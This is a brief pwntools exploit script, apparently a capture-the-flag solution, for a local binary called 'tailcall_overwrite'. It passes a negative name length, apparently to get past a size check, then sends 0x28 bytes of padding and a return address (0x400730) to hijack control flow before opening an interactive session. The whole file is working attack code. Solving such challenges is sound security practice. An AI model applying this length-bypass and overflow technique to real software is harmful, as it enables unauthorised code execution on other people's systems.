from pwn import *
context.log_level = "debug"
r = process('./tailcall_overwrite')
vul_addr='a'*0x28+p64(0x400730)
r.recvuntil("plz input your name length:\n")
r.sendline("-1")
r.recvuntil("plz input your name:\n")
r.sendline(vul_addr)
r.interactive()


